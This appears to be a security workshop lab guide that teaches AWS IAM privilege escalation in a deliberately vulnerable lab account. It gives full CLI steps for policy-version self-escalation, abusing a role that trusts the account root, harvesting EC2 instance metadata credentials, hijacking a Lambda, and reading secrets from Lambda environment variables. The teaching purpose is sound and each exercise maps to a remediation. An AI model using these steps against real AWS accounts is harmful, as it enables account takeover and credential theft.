# Lab 1 - Layin' Down the Law: Identifying and Exploiting IAM Misconfigurations

**Duration:** 45 minutes

## Overview

In this lab, you'll use industry-standard tools to discover and exploit privilege escalation vulnerabilities in AWS IAM. This hands-on experience demonstrates why IAM misconfigurations are consistently ranked among the top cloud security risks.

**What You'll Learn:**
- How attackers use tools like **pmapper** to automatically discover IAM vulnerabilities
- How to visualize IAM relationships using **awspx**
- The five categories of IAM privilege escalation (from pathfinding.cloud)
- How to exploit five distinct privilege escalation paths—each with a **different root cause**

**Why This Matters:**
IAM misconfigurations are the #1 cause of cloud breaches. A single overly-permissive policy can allow an attacker to escalate from a low-privilege user to full account administrator. By understanding how attackers find and exploit these vulnerabilities, you'll be better equipped to prevent them.

---

## Prerequisites

Complete [Lab 0 - Prerequisites](../lab-0-prerequisites/lab-0-prerequisites.md) before starting. If you're at Wild West Hackin' Fest, your environment is pre-configured.

Verify your setup:
```bash
aws sts get-caller-identity
```

You should see your account ID and IAM principal.

---

## The Five Privilege Escalation Categories

Before we dive in, understand that ALL IAM privilege escalation falls into five categories (from [pathfinding.cloud](https://pathfinding.cloud)):

| Category | Description | What Gets Compromised |
|----------|-------------|-----------------------|
| **Self-Escalation** | Modify your own permissions | Your own principal |
| **Principal Access** | Access another principal's credentials or trust | Another user or role |
| **New PassRole** | Pass a role to NEW compute (EC2, Lambda, etc.) | Compute resource credentials |
| **Existing PassRole** | Modify EXISTING compute that has a role | Existing Lambda, EC2, etc. |
| **Credential Access** | Access credentials stored insecurely | Secrets, keys, passwords |

In this lab, you'll exploit **one vulnerability from each category**—with five different root causes requiring five different defenses.

---

## Exercise 1: Building Your IAM Intelligence

Before you can find vulnerabilities, you need visibility. In this exercise, you'll use two complementary tools:

- **pmapper** (Principal Mapper): Builds a graph of IAM principals and analyzes privilege escalation paths
- **awspx**: Visualizes IAM relationships as an interactive graph

### Understanding the Tools

| Tool | Purpose | Output |
|------|---------|--------|
| pmapper | Automated privilege escalation analysis | Text-based findings and queries |
| awspx | Visual IAM relationship mapping | Interactive graph in browser |

### Part A: Create the pmapper Graph

pmapper works by first building a "graph" of your AWS account's IAM configuration. This graph captures all users, roles, groups, and their permissions.

1. **Create the IAM graph:**
   ```bash
   pmapper graph create
   ```

   This command:
   - Enumerates all IAM users, roles, and groups
   - Retrieves all attached and inline policies
   - Analyzes trust relationships between principals
   - Takes 1-2 minutes to complete

2. **View the graph summary:**
   ```bash
   pmapper graph display
   ```

   You should see output like:
   ```
   Graph Data for Account:  115753408004
     # of Nodes:              42 (9 admins)
     # of Edges:              38
     # of Groups:             0
     # of (tracked) Policies: 48
   ```

   The "9 admins" tells you how many principals have administrative access—these are high-value targets for attackers.

### Part B: Run Privilege Escalation Analysis

Now use pmapper to automatically find privilege escalation paths:

```bash
pmapper analysis --output-type text
```

**What to look for:** Scan the output for users starting with `iamws-`. These are the intentionally vulnerable principals we'll explore:

```
* user/iamws-ci-runner-user can escalate privileges by accessing the
  administrative principal role/iamws-prod-deploy-role:
   * user/iamws-ci-runner-user can use EC2 to run an instance with an
     existing instance profile to access role/iamws-prod-deploy-role

* user/iamws-role-assumer-user can escalate privileges by accessing
  the administrative principal role/iamws-privileged-admin-role:
   * user/iamws-role-assumer-user can access via sts:AssumeRole
     role/iamws-privileged-admin-role

* user/iamws-lambda-developer-user can escalate privileges by accessing
  the administrative principal role/iamws-privileged-lambda-role:
   * user/iamws-lambda-developer-user can use Lambda to edit an existing
     function to access role/iamws-privileged-lambda-role
```

**Key insight:** pmapper automatically identified that low-privilege users can reach administrative principals. An attacker with access to any of these users could compromise the entire account.

### Part C: Load Data into awspx

awspx provides a visual way to explore IAM relationships. It's already running at [http://localhost](http://localhost).

1. **Ingest AWS IAM data:**
   ```bash
   docker exec awspx python3 /opt/awspx/cli.py ingest \
     --env --services IAM --region us-east-1
   ```

   This pulls the same IAM data into awspx's graph database.

2. **Open awspx** in your browser at [http://localhost](http://localhost)

3. **Search for workshop users:** Type `iamws` in the search box to see the workshop IAM principals

You now have two powerful tools ready to explore IAM vulnerabilities.

---

## Exercise 2: CreatePolicyVersion - Self-Escalation

**Category:** Self-Escalation
**Attacker:** `iamws-policy-developer-user`

**The Vulnerability:** The `iamws-policy-developer-user` can create new versions of IAM policies—including a policy that's attached to themselves. By creating a new version with administrator permissions and setting it as default, they escalate their own privileges.

**Real-world scenario:** A developer is given permission to manage "development" policies for their team. Without proper constraints, they can modify ANY policy—including ones attached to their own user, effectively granting themselves any permission they want.

### Part A: Identify with pmapper

First, confirm this user has the dangerous permission:

```bash
pmapper query "can user/iamws-policy-developer-user do iam:CreatePolicyVersion with *"
```

Expected output:
```
user/iamws-policy-developer-user IS authorized to call action
iam:CreatePolicyVersion for resource *
```

**What this means:** The user can create new versions of ANY policy. The `*` wildcard is part of the problem—but even restricting the Resource wouldn't fully fix it if they can still modify policies attached to themselves.

### Part B: Understand the Attack Category

Visit [pathfinding.cloud IAM-001](https://pathfinding.cloud/paths/iam-001) to understand this attack path:

- **Category:** Self-Escalation
- **Required Permission:** `iam:CreatePolicyVersion` (or `iam:SetDefaultPolicyVersion`)
- **Attack:** Create a new policy version with admin permissions, set as default
- **Impact:** Immediate full account access

Self-escalation attacks are the simplest privilege escalation—the attacker doesn't need to compromise another principal, they just modify their own permissions.

### Part C: Exploit the Vulnerability

Now let's prove this vulnerability is exploitable.

**Step 1: Get credentials for the vulnerable principal**
```bash
# Store the account ID
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

# Assume the vulnerable role
CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-policy-developer-role \
  --role-session-name attacker \
  --query "Credentials" \
  --output json)

# Set the credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
```

**Step 2: Verify your attacker identity**
```bash
aws sts get-caller-identity
```

You should see you're now operating as the `iamws-policy-developer-role`.

**Step 3: Identify the policy attached to this user**
```bash
# The developer-tools-policy is attached to this user
POLICY_ARN="arn:aws:iam::${ACCOUNT_ID}:policy/iamws-developer-tools-policy"

# View the current policy
aws iam get-policy-version \
  --policy-arn $POLICY_ARN \
  --version-id v1 \
  --query 'PolicyVersion.Document' \
  --output json
```

Note the limited permissions (S3, EC2 read-only).

**Step 4: Create a new policy version with admin permissions**
```bash
aws iam create-policy-version \
  --policy-arn $POLICY_ARN \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }]
  }' \
  --set-as-default
```

**Step 5: Verify the escalation**
```bash
# Now test an admin action - list all IAM users
aws iam list-users --query 'Users[].UserName' --output table
```

**You just escalated a low-privilege developer to full administrator** by modifying a policy attached to yourself.

### Cleanup

Reset your credentials before continuing:
```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN

# Verify you're back to your original identity
aws sts get-caller-identity
```

**Instructor will reset the policy version.**

### What You Learned

- **iam:CreatePolicyVersion** allows modifying any policy, including ones attached to self
- The root cause is the ability to modify a policy that grants YOUR OWN permissions
- Even with resource constraints, if you can modify your own attached policy, you can escalate
- **Remediation preview:** In Lab 2, you'll apply a **Permissions Boundary** to cap maximum permissions

---

## Exercise 3: AssumeRole - Principal Access via Permissive Trust

**Category:** Principal Access
**Attacker:** `iamws-role-assumer-user`
**Target:** `iamws-privileged-admin-role`

**The Vulnerability:** The `iamws-privileged-admin-role` has an overly permissive trust policy—it trusts the entire AWS account (`:root`). Any principal in the account with `sts:AssumeRole` permission can assume this admin role.

**Real-world scenario:** An administrator creates a privileged role and sets the trust policy to the account root, thinking "this restricts it to our account." But account root trust means ANY principal in the account with AssumeRole permission can become this role.

### Part A: Identify with pmapper

```bash
pmapper query "can user/iamws-role-assumer-user do sts:AssumeRole with arn:aws:iam::*:role/iamws-privileged-admin-role"
```

Expected output:
```
user/iamws-role-assumer-user IS authorized to call action
sts:AssumeRole for resource arn:aws:iam::*:role/iamws-privileged-admin-role
```

### Part B: Understand the Attack Category

Visit [pathfinding.cloud STS-001](https://pathfinding.cloud/paths/sts-001) to understand this attack path:

- **Category:** Principal Access
- **Required Permission:** `sts:AssumeRole` + permissive trust policy on target
- **Root Cause:** Trust policy trusts account root instead of specific principals
- **Impact:** Access to any role with permissive trust

**Key insight:** The vulnerability is NOT in the attacker's `sts:AssumeRole` permission—it's in the TARGET role's trust policy. The trust policy is a **resource policy** that controls who can assume the role.

### Part C: Examine the Trust Policy

First, look at the vulnerable trust policy:

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

aws iam get-role --role-name iamws-privileged-admin-role \
  --query 'Role.AssumeRolePolicyDocument' --output json
```

You'll see:
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": { "AWS": "arn:aws:iam::ACCOUNT_ID:root" },
    "Action": "sts:AssumeRole"
  }]
}
```

**The problem:** `:root` means "any principal in this account"—not "the root user."

### Part D: Exploit the Vulnerability

**Step 1: Assume the low-privilege role**
```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-role-assumer-role \
  --role-session-name attacker \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
```

**Step 2: Verify your low-privilege identity**
```bash
aws sts get-caller-identity
```

**Step 3: Assume the privileged admin role**
```bash
ADMIN_CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-privileged-admin-role \
  --role-session-name escalated \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $ADMIN_CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $ADMIN_CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $ADMIN_CREDS | jq -r '.SessionToken')
```

**Step 4: Verify escalation**
```bash
aws sts get-caller-identity
```

You should see `iamws-privileged-admin-role` in the ARN. You now have `AdministratorAccess`.

### Cleanup

```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

### What You Learned

- Trust policies using `:root` trust the entire account, not just the root user
- The vulnerability is in the **resource policy** (trust policy), not the identity policy
- **Remediation preview:** In Lab 2, you'll **harden the trust policy** to trust only specific principals

---

## Exercise 4: PassRole + EC2 - New PassRole

**Category:** New PassRole
**Attacker:** `iamws-ci-runner-user`
**Target:** `iamws-prod-deploy-role` (via EC2 instance)

**The Vulnerability:** The `iamws-ci-runner-user` can pass any role to an EC2 instance because the PassRole permission is missing the `iam:PassedToService` condition key. By launching an instance with a privileged instance profile, they can harvest the role's credentials from the instance metadata service.

**Real-world scenario:** A CI/CD pipeline user needs to launch EC2 instances for build jobs. Without the `iam:PassedToService` condition, they can pass ANY role to EC2—including production admin roles.

### Part A: Identify with pmapper

```bash
pmapper query "can user/iamws-ci-runner-user do iam:PassRole with *"
```

Expected output:
```
user/iamws-ci-runner-user IS authorized to call action iam:PassRole for resource *
```

Also check the escalation path:
```bash
pmapper analysis --output-type text | grep -A2 "iamws-ci-runner-user"
```

### Part B: Understand the Attack Category

Visit [pathfinding.cloud EC2-001](https://pathfinding.cloud/paths/ec2-001):

- **Category:** New PassRole
- **Required Permissions:** `iam:PassRole` + `ec2:RunInstances` (unrestricted)
- **Root Cause:** Missing `iam:PassedToService` condition key
- **Impact:** Access to any role that has an instance profile

PassRole attacks are indirect—the attacker doesn't directly become the role, they pass it to a compute service that exposes the credentials.

### Part C: Examine the Vulnerable Policy

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

aws iam get-policy-version \
  --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/iamws-ci-runner-policy \
  --version-id v1 \
  --query 'PolicyVersion.Document' \
  --output json
```

Notice the PassRole statement has `Resource: "*"` but **no Condition block**. The missing condition is:
```json
"Condition": {
  "StringEquals": {
    "iam:PassedToService": "ec2.amazonaws.com"
  }
}
```

### Part D: Understand the Attack Flow

We won't actually launch an EC2 instance (to avoid costs), but here's how the attack works:

**Step 1: Assume the CI runner role**
```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-ci-runner-role \
  --role-session-name attacker \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
```

**Step 2: Find privileged instance profiles**
```bash
aws iam list-instance-profiles \
  --query 'InstanceProfiles[].{Name:InstanceProfileName,Roles:Roles[].RoleName}' \
  --output table
```

You'll see `iamws-prod-deploy-profile` with role `iamws-prod-deploy-role` (which has `*:*` permissions).

**Step 3 (Conceptual): Launch EC2 with privileged profile**
```bash
# DO NOT RUN - for illustration only
aws ec2 run-instances \
  --image-id ami-xxxxx \
  --instance-type t2.micro \
  --iam-instance-profile Name=iamws-prod-deploy-profile \
  --key-name my-key
```

**Step 4 (Conceptual): Harvest credentials from instance**
```bash
# From inside the EC2 instance:
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/iamws-prod-deploy-role
```

The metadata service returns temporary credentials for the attached role.

### Cleanup

```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

### What You Learned

- **iam:PassRole** controls which roles can be attached to compute services
- The missing `iam:PassedToService` condition is the root cause (not just `Resource: "*"`)
- Unrestricted PassRole + compute permissions = credential access to any role with an instance profile
- **Remediation preview:** In Lab 2, you'll add the **iam:PassedToService condition key**

---

## Exercise 5: UpdateFunctionCode - Existing PassRole

**Category:** Existing PassRole
**Attacker:** `iamws-lambda-developer-user`
**Target:** `iamws-privileged-lambda` (with `iamws-privileged-lambda-role`)

**The Vulnerability:** The `iamws-lambda-developer-user` can update the code of ANY Lambda function—including functions that have privileged execution roles. By replacing the code with a malicious payload, they can exfiltrate the Lambda's credentials.

**Real-world scenario:** A developer can deploy code to Lambda functions but shouldn't be able to access production resources. If they can modify ANY Lambda (not just their own), they can target Lambdas with privileged roles.

### Part A: Identify with pmapper

```bash
pmapper query "can user/iamws-lambda-developer-user do lambda:UpdateFunctionCode with *"
```

Check the escalation path:
```bash
pmapper analysis --output-type text | grep -A2 "iamws-lambda-developer-user"
```

Expected output:
```
* user/iamws-lambda-developer-user can escalate privileges by accessing
  the administrative principal role/iamws-privileged-lambda-role:
   * user/iamws-lambda-developer-user can use Lambda to edit an existing
     function (arn:aws:lambda:...:function:iamws-privileged-lambda)
```

### Part B: Understand the Attack Category

Visit [pathfinding.cloud Lambda-003](https://pathfinding.cloud/paths/lambda-003):

- **Category:** Existing PassRole
- **Required Permission:** `lambda:UpdateFunctionCode` (unrestricted)
- **Root Cause:** Can modify ANY Lambda, not just designated ones
- **Impact:** Access to any Lambda's execution role

Unlike "New PassRole" where you CREATE new compute, "Existing PassRole" exploits EXISTING compute that already has a role attached.

### Part C: Exploit the Vulnerability

**Step 1: Assume the Lambda developer role**
```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-lambda-developer-role \
  --role-session-name attacker \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
```

**Step 2: Find the privileged Lambda**
```bash
aws lambda list-functions \
  --query 'Functions[?starts_with(FunctionName, `iamws`)].{Name:FunctionName,Role:Role}' \
  --output table
```

You'll see `iamws-privileged-lambda` with role `iamws-privileged-lambda-role` (which has `AdministratorAccess`).

**Step 3: View the target function's role**
```bash
aws lambda get-function --function-name iamws-privileged-lambda \
  --query 'Configuration.Role' --output text
```

**Step 4 (Conceptual): Update with malicious code**

The attack would replace the Lambda code with:
```python
import boto3
import os

def handler(event, context):
    # Exfiltrate the credentials
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()

    # The Lambda has AdministratorAccess!
    # Attacker could: create new IAM user, exfiltrate data, etc.
    return identity
```

Then invoke the function to get the credentials.

### Cleanup

```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

### What You Learned

- **lambda:UpdateFunctionCode** with `Resource: "*"` allows hijacking any Lambda
- The root cause is the lack of **resource constraint** (should restrict to specific Lambda ARNs)
- Existing PassRole attacks target compute that ALREADY has privileged roles
- **Remediation preview:** In Lab 2, you'll add a **resource constraint** to limit which Lambdas can be modified

---

## Exercise 6: GetFunctionConfiguration - Credential Access

**Category:** Credential Access
**Attacker:** `iamws-secrets-reader-user`
**Target:** Secrets in `iamws-app-with-secrets` Lambda environment variables

**The Vulnerability:** The `iamws-secrets-reader-user` can read Lambda function configurations, which include environment variables. A Lambda function has secrets (database password, API keys) stored in plaintext environment variables—visible to anyone who can call `GetFunctionConfiguration`.

**Real-world scenario:** A monitoring or debugging tool needs read access to Lambda configurations. Environment variables are a common (but insecure) place to store secrets. Anyone with this read permission can see all secrets.

### Part A: Identify with pmapper

```bash
pmapper query "can user/iamws-secrets-reader-user do lambda:GetFunctionConfiguration with *"
```

Expected output:
```
user/iamws-secrets-reader-user IS authorized to call action
lambda:GetFunctionConfiguration for resource *
```

### Part B: Understand the Attack Category

- **Category:** Credential Access
- **Required Permission:** `lambda:GetFunctionConfiguration`
- **Root Cause:** Secrets stored in plaintext Lambda environment variables
- **Impact:** Access to credentials for external systems (databases, APIs, etc.)

This category is different—you're not escalating IAM permissions, you're accessing credentials that grant access outside AWS.

### Part C: Exploit the Vulnerability

**Step 1: Assume the secrets reader role**
```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

CREDS=$(aws sts assume-role \
  --role-arn arn:aws:iam::${ACCOUNT_ID}:role/iamws-secrets-reader-role \
  --role-session-name attacker \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.SessionToken')
```

**Step 2: Find Lambdas with environment variables**
```bash
aws lambda list-functions \
  --query 'Functions[?Environment.Variables].FunctionName' \
  --output table
```

**Step 3: Read the secrets**
```bash
aws lambda get-function-configuration \
  --function-name iamws-app-with-secrets \
  --query 'Environment.Variables' \
  --output json
```

**Expected output (SECRETS EXPOSED!):**
```json
{
    "DB_HOST": "prod-db.example.internal",
    "DB_USERNAME": "app_service_account",
    "DB_PASSWORD": "SuperSecretPassword123!",
    "API_KEY": "sk-prod-api-key-do-not-expose",
    "ADMIN_CREDENTIALS": "admin:P@ssw0rd!"
}
```

**You just read production database credentials, API keys, and admin passwords.**

### Cleanup

```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

### What You Learned

- Lambda environment variables are **visible to anyone** with `GetFunctionConfiguration`
- This is NOT an IAM privilege escalation—it's credential theft
- Secrets in env vars is a **best practice violation**, not a policy misconfiguration
- **Remediation preview:** In Lab 2, you'll learn to use **AWS Secrets Manager** instead

---

## Wrap-up

### What You Accomplished

In this lab, you:
1. Built an IAM graph using pmapper and identified privilege escalation paths
2. Explored IAM relationships visually with awspx
3. Exploited **five distinct privilege escalation vulnerabilities**, each with a **different root cause**:

| Exercise | Attack | Category | Root Cause |
|----------|--------|----------|------------|
| 2 | CreatePolicyVersion | Self-Escalation | Can modify policy attached to self |
| 3 | AssumeRole | Principal Access | Trust policy trusts account root |
| 4 | PassRole + EC2 | New PassRole | Missing iam:PassedToService condition |
| 5 | UpdateFunctionCode | Existing PassRole | Can modify any Lambda (no resource constraint) |
| 6 | GetFunctionConfiguration | Credential Access | Secrets in plaintext env vars |

### Why Different Root Causes Matter

If all vulnerabilities had the same root cause (like `Resource: "*"`), you'd think:
> "Just avoid wildcard resources and I'm safe."

But each vulnerability requires a **different defense**:

| Root Cause | Defense |
|------------|---------|
| Can modify own attached policy | **Permissions Boundary** |
| Trust policy too permissive | **Harden Trust Policy** |
| PassRole missing condition | **Condition Key** (`iam:PassedToService`) |
| Can modify any resource | **Resource Constraint** |
| Secrets in plaintext | **Use Secrets Manager** |

### Mapping to Lab 2 Remediations

| Vulnerability | Lab 2 Guardrail | Defense Type |
|---------------|-----------------|--------------|
| CreatePolicyVersion | Permissions Boundary | Permissions Boundary |
| AssumeRole (permissive trust) | Harden Trust Policy | Resource Policy |
| PassRole + EC2 | Add Condition Key | Condition Key |
| UpdateFunctionCode | Resource Constraint | Identity Policy Fix |
| GetFunctionConfiguration | Use Secrets Manager | Best Practice |

---

## Next Steps

Continue to **[Lab 2 - Fencin' the Frontier](../lab-2-fencin-the-frontier/lab-2-instructions.md)** where you'll apply guardrails to prevent the attacks you just executed.

---

## Optional: Additional pmapper Queries

Explore more of pmapper's query capabilities:

```bash
# Who can become admin?
pmapper query "who can do iam:* with *"

# Can a specific user reach admin?
pmapper query "can user/iamws-ci-runner-user do s3:* with *"

# Who can pass a specific role?
pmapper query "who can do iam:PassRole with arn:aws:iam::*:role/iamws-prod-deploy-role"

# List all privesc paths
pmapper analysis --output-type text

# Visualize the graph (requires graphviz)
pmapper visualize
```
